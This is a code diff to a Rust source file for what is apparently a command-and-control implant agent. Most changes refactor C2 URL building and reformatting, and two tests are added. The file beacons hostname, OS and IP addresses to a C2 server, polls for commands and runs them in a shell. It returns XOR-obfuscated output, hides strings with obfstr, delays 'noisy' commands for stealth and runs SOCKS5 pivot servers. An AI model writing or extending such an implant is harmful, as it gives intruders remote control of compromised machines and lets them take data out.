@@ -1,16 +1,18 @@
-use crate::commands::obfuscated::{xor_obfuscate};
-use crate::config::AgentConfig;
+use crate::commands::obfuscated::xor_obfuscate;
+use crate::config::{validate_c2_base_url, AgentConfig};
 use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
 use crate::networking::socks5_pivot_server::Socks5PivotServer;
-use crate::opsec::{AgentMode, determine_agent_mode};
+use crate::opsec::{determine_agent_mode, AgentMode};
 use crate::util::random_jitter;
 use get_if_addrs::get_if_addrs;
 use hostname;
-use log::{info, error, debug, warn};
+use log::{debug, error, info, warn};
+use obfstr::obfstr;
 use once_cell::sync::Lazy;
 use os_info;
-use reqwest::StatusCode;
+use reqwest::{Method, StatusCode, Url};
+use serde::Deserialize;
 use serde_json::json;
 use std::collections::HashMap;
 use std::env;
@@ -19,21 +21,56 @@ use std::path::Path;
 use std::process::Command;
 use std::sync::Arc;
 use std::sync::Mutex;
-use std::time::{Duration};
-use tokio::sync::Mutex as TokioMutex;
+use std::time::Duration;
 use tokio::sync::mpsc;
+use tokio::sync::Mutex as TokioMutex;
 use tokio::task::JoinHandle;
 use tokio::time::timeout;
-use obfstr::obfstr;
-use serde::Deserialize;
 
-static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
+static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> =
+    Lazy::new(|| TokioMutex::new(HashMap::new()));
 static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
 
 // Define the expected structure for the command response JSON
 #[derive(Deserialize)]
 struct CommandResponse {
     command: String,
+}
+
+#[derive(Clone, Copy)]
+enum C2Endpoint {
+    Heartbeat,
+    Command,
+    Result,
+}
+
+impl C2Endpoint {
+    fn as_segment(self) -> &'static str {
+        match self {
+            Self::Heartbeat => "heartbeat",
+            Self::Command => "command",
+            Self::Result => "result",
+        }
+    }
+}
+
+fn build_c2_endpoint_url(
+    server_addr: &str,
+    agent_id: &str,
+    endpoint: C2Endpoint,
+) -> io::Result<Url> {
+    let mut url = validate_c2_base_url(server_addr)
+        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
+
+    url.path_segments_mut()
+        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "C2 URL cannot be a base"))?
+        .pop_if_empty()
+        .push("api")
+        .push("agent")
+        .push(agent_id)
+        .push(endpoint.as_segment());
+
+    Ok(url)
 }
 
 //  Helper function to get current timestamp
@@ -63,7 +100,8 @@ fn get_all_local_ips() -> Vec<String> {
     let mut ips = Vec::new();
     if let Ok(ifaces) = get_if_addrs() {
         for iface in ifaces {
-            match iface.addr.ip() { // Use .ip() to get the IpAddr
+            match iface.addr.ip() {
+                // Use .ip() to get the IpAddr
                 std::net::IpAddr::V4(ipv4) => {
                     if !ipv4.is_loopback() && !ipv4.is_multicast() {
                         ips.push(ipv4.to_string());
@@ -87,16 +125,26 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
 
     // Handle cd command specially
     if cmd_parts[0] == "cd" {
-        if let Some(dir) = cmd_parts.get(1) {
+        if cmd_parts.len() > 1 {
+            let dir = cmd_parts[1];
             let path = Path::new(dir);
             if path.exists() {
                 env::set_current_dir(path)?;
-                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
+                return Ok(format!(
+                    "Changed directory to {}",
+                    env::current_dir()?.display()
+                ));
             } else {
-                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
+                return Err(io::Error::new(
+                    io::ErrorKind::NotFound,
+                    "Directory not found",
+                ));
             }
         }
-        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
+        return Ok(format!(
+            "Current directory: {}",
+            env::current_dir()?.display()
+        ));
     }
 
     // Handle other commands with timeout
@@ -108,22 +156,28 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
             create_command(cmd_parts[0], &cmd_parts[1..]).output()?
         };
 
-        Ok::<_, io::Error>(format!("{}{}",
+        Ok::<_, io::Error>(format!(
+            "{}{}",
             String::from_utf8_lossy(&output.stdout),
-            String::from_utf8_lossy(&output.stderr)))
-    }).await;
+            String::from_utf8_lossy(&output.stderr)
+        ))
+    })
+    .await;
 
     match result {
         Ok(Ok(output)) => Ok(output),
         Ok(Err(e)) => Err(e),
-        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
+        Err(_) => Err(io::Error::new(
+            io::ErrorKind::TimedOut,
+            "Command timed out after 30 seconds",
+        )),
     }
 }
 
 //  Update C2 failure tracking to use new accessor pattern
 fn update_c2_failure_state(success: bool) {
     use crate::opsec::with_opsec_state_mut;
-    
+
     with_opsec_state_mut(|state| {
         if success {
             if state.consecutive_c2_failures > 0 {
@@ -132,7 +186,10 @@ fn update_c2_failure_state(success: bool) {
             }
         } else {
             state.consecutive_c2_failures = state.consecutive_c2_failures.saturating_add(1);
-            warn!("[OPSEC C2] C2 communication failed, consecutive failures: {}", state.consecutive_c2_failures);
+            warn!(
+                "[OPSEC C2] C2 communication failed, consecutive failures: {}",
+                state.consecutive_c2_failures
+            );
         }
     });
 }
@@ -140,29 +197,39 @@ fn update_c2_failure_state(success: bool) {
 //  Add function to mark noisy command executed
 fn mark_noisy_command_executed() {
     use crate::opsec::with_opsec_state_mut;
-    
+
     with_opsec_state_mut(|state| {
         state.last_noisy_command_time = Some(now_timestamp()); //  Use timestamp instead of Instant
     });
 }
 
 // Send heartbeat to the server
-pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
-    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
-    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() { // Handle client build failure as a C2 failure
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
-    
+pub async fn send_heartbeat_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+) -> io::Result<()> {
+    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Heartbeat)?;
+    info!(
+        "[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})",
+        url, config.socks5_enabled
+    );
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            update_c2_failure_state(false);
+            return Err(io::Error::other(e));
+        }
+    };
+
     let os = os_info::get();
-    let hostname = hostname::get()?
-        .to_string_lossy()
-        .to_string();
+    let hostname = hostname::get()?.to_string_lossy().to_string();
     let ip_list = get_all_local_ips();
-    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
+    let ip = if ip_list.is_empty() {
+        "Unknown".into()
+    } else {
+        ip_list.join(",")
+    };
     let egress_ip = get_egress_ip(server_addr);
 
     let data = json!({
@@ -175,9 +242,13 @@ pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str,
         "commands": Vec::<String>::new()
     });
 
-    match client.post(&url).json(&data).send().await {
+    match client.request(Method::POST, url).json(&data).send().await {
         Ok(response) => {
-            info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+            info!(
+                "[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})",
+                response.status(),
+                config.socks5_enabled
+            );
             if response.status().is_success() {
                 update_c2_failure_state(true); // SUCCESS
                 Ok(())
@@ -196,19 +267,31 @@ pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str,
 }
 
 // Fetch command from the server
-async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
-    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
-    info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() {
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
+async fn get_command_with_client(
+    config: &AgentConfig,
+    server_addr: &str,
+    agent_id: &str,
+) -> io::Result<Option<String>> {
+    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Command)?;
+    info!(
+        "[HTTP] Sending command GET to {} (SOCKS5 enabled: {})",
+        url, config.socks5_enabled
+    );
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            update_c2_failure_state(false);
+            return Err(io::Error::other(e));
+        }
+    };
 
-    match client.get(&url).send().await {
+    match client.request(Method::GET, url).send().await {
         Ok(response) => {
-            info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+            info!(
+                "[HTTP] Command GET response: {} (SOCKS5 enabled: {})",
+                response.status(),
+                config.socks5_enabled
+            );
             if response.status() == StatusCode::NO_CONTENT {
                 update_c2_failure_state(true); // SUCCESS (no command)
                 return Ok(None);
@@ -223,11 +306,17 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
                     Err(e) => {
                         error!("[HTTP] Failed to parse command response JSON: {}", e);
                         update_c2_failure_state(false); // FAILURE (bad JSON)
-                        Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid JSON response"))
+                        Err(io::Error::new(
+                            io::ErrorKind::InvalidData,
+                            "Invalid JSON response",
+                        ))
                     }
                 }
             } else {
-                error!("[HTTP] Command fetch failed with status: {}", response.status());
+                error!(
+                    "[HTTP] Command fetch failed with status: {}",
+                    response.status()
+                );
                 update_c2_failure_state(false); // FAILURE (bad HTTP status)
                 Err(io::Error::new(io::ErrorKind::Other, "Command fetch failed"))
             }
@@ -246,32 +335,46 @@ async fn submit_result_with_client(
     server_addr: &str,
     agent_id: &str,
     command: &str,
-    output: &str
+    output: &str,
 ) -> io::Result<()> {
-    let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
-    info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client_result = config.build_http_client();
-    if client_result.is_err() {
-        update_c2_failure_state(false);
-        return Err(io::Error::new(io::ErrorKind::Other, client_result.err().unwrap()));
-    }
-    let client = client_result.unwrap();
+    let url = build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Result)?;
+    info!(
+        "[HTTP] Sending result POST to {} (SOCKS5 enabled: {})",
+        url, config.socks5_enabled
+    );
+    let client = match config.build_http_client() {
+        Ok(client) => client,
+        Err(e) => {
+            update_c2_failure_state(false);
+            return Err(io::Error::other(e));
+        }
+    };
     let obfuscated_output = xor_obfuscate(output, agent_id);
     let data = json!({
         "command": command,
         "output": obfuscated_output
     });
 
-    match client.post(&url).json(&data).send().await {
+    match client.request(Method::POST, url).json(&data).send().await {
         Ok(response) => {
-            info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+            info!(
+                "[HTTP] Result POST response: {} (SOCKS5 enabled: {})",
+                response.status(),
+                config.socks5_enabled
+            );
             if response.status().is_success() {
                 update_c2_failure_state(true); // SUCCESS
                 Ok(())
             } else {
-                error!("[HTTP] Result submission failed with status: {}", response.status());
+                error!(
+                    "[HTTP] Result submission failed with status: {}",
+                    response.status()
+                );
                 update_c2_failure_state(false); // FAILURE
-                Err(io::Error::new(io::ErrorKind::Other, "Result submission failed"))
+                Err(io::Error::new(
+                    io::ErrorKind::Other,
+                    "Result submission failed",
+                ))
             }
         }
         Err(e) => {
@@ -283,10 +386,7 @@ async fn submit_result_with_client(
 }
 
 fn is_weak_command(cmd: &str) -> bool {
-    let quiet = [
-        obfstr!("ping").to_string(),
-        obfstr!("echo").to_string(),
-    ];
+    let quiet = [obfstr!("ping").to_string(), obfstr!("echo").to_string()];
     quiet.iter().any(|q| cmd.starts_with(q))
 }
 
@@ -342,7 +442,10 @@ pub async fn agent_loop(
     // Use a separate Result variable to avoid breaking loop on first heartbeat failure
     let initial_heartbeat_result = send_heartbeat_with_client(&config, server_addr, agent_id).await;
     if let Err(e) = initial_heartbeat_result {
-        error!("[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.", e);
+        error!(
+            "[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.",
+            e
+        );
         // No need to break explicitly, loop condition will handle it if state changed due to failure
     }
 
@@ -352,24 +455,31 @@ pub async fn agent_loop(
 
         // If no longer in BackgroundOpsec, exit agent_loop immediately
         if current_mode != AgentMode::BackgroundOpsec {
-            info!("[SHELL] Mode changed to {:?}, exiting agent_loop", current_mode);
+            info!(
+                "[SHELL] Mode changed to {:?}, exiting agent_loop",
+                current_mode
+            );
             break;
         }
 
         // Still in BackgroundOpsec, proceed with C2 communication
         let sleep_time = random_jitter(config.sleep_interval, config.jitter);
         info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);
-        
+
         match get_command_with_client(&config, server_addr, agent_id).await {
             Ok(Some(command)) => {
                 info!("[SHELL] Received command: {}", command);
-                
+
                 // Check if we should queue this command or execute immediately
                 if should_queue_command(&command) {
                     // Queue the command
                     let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
                     queue_guard.push(command.clone());
-                    info!("[OPSEC] Command '{}' queued (total queued: {})", command, queue_guard.len());
+                    info!(
+                        "[OPSEC] Command '{}' queued (total queued: {})",
+                        command,
+                        queue_guard.len()
+                    );
                 } else {
                     // Execute immediately (only weak commands in BackgroundOpsec)
                     info!("[SHELL] Executing weak command immediately: {}", command);
@@ -377,14 +487,30 @@ pub async fn agent_loop(
                     match execute_command(&cmd_parts).await {
                         Ok(output) => {
                             info!("[SHELL] Command executed successfully");
-                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
+                            if let Err(e) = submit_result_with_client(
+                                &config,
+                                server_addr,
+                                agent_id,
+                                &command,
+                                &output,
+                            )
+                            .await
+                            {
                                 error!("[SHELL] Failed to submit result: {}", e);
                             }
                         }
                         Err(e) => {
                             error!("[SHELL] Command execution failed: {}", e);
                             let error_output = format!("Error: {}", e);
-                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_output).await {
+                            if let Err(e) = submit_result_with_client(
+                                &config,
+                                server_addr,
+                                agent_id,
+                                &command,
+                                &error_output,
+                            )
+                            .await
+                            {
                                 error!("[SHELL] Failed to submit error result: {}", e);
                             }
                         }
@@ -401,37 +527,59 @@ pub async fn agent_loop(
             }
         }
 
-        // --- Process Queued Commands --- 
+        // --- Process Queued Commands ---
         // Always check and process queue while in BackgroundOpsec
         let mut commands_to_run = Vec::new();
         {
             let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
             commands_to_run.extend(queue_guard.drain(..));
         } // Lock released
-        
+
         if !commands_to_run.is_empty() {
-            info!("[SHELL] Processing {} queued commands", commands_to_run.len());
+            info!(
+                "[SHELL] Processing {} queued commands",
+                commands_to_run.len()
+            );
             for command in commands_to_run {
                 info!("[SHELL] Executing queued command: {}", command);
                 let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                
+
                 //  Mark noisy command execution with timestamp
                 if is_strong_command(&command) {
                     mark_noisy_command_executed(); //  Use timestamp instead of Instant
                 }
-                
+
                 match execute_command(&cmd_parts).await {
                     Ok(output) => {
                         info!("[SHELL] Queued command executed successfully");
-                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
+                        if let Err(e) = submit_result_with_client(
+                            &config,
+                            server_addr,
+                            agent_id,
+                            &command,
+                            &output,
+                        )
+                        .await
+                        {
                             error!("[SHELL] Failed to submit queued command result: {}", e);
                         }
                     }
                     Err(e) => {
                         error!("[SHELL] Queued command execution failed: {}", e);
                         let error_output = format!("Error: {}", e);
-                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_output).await {
-                            error!("[SHELL] Failed to submit queued command error result: {}", e);
+                        if let Err(e) = submit_result_with_client(
+                            &config,
+                            server_addr,
+                            agent_id,
+                            &command,
+                            &error_output,
+                        )
+                        .await
+                        {
+                            error!(
+                                "[SHELL] Failed to submit queued command error result: {}",
+                                e
+                            );
                         }
                     }
                 }
@@ -481,3 +629,33 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
     }
 }
 
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn builds_c2_endpoint_urls_from_validated_base() -> io::Result<()> {
+        let url = build_c2_endpoint_url(
+            "https://c2.example/base/",
+            "agent/one",
+            C2Endpoint::Heartbeat,
+        )?;
+
+        assert_eq!(
+            url.as_str(),
+            "https://c2.example/base/api/agent/agent%2Fone/heartbeat"
+        );
+
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_invalid_c2_endpoint_bases() {
+        let err = match build_c2_endpoint_url("file:///tmp/c2", "agent-one", C2Endpoint::Command) {
+            Ok(url) => panic!("unexpected valid C2 URL: {}", url),
+            Err(err) => err,
+        };
+
+        assert_eq!(err.kind(), io::ErrorKind::InvalidInput);
+    }
+}
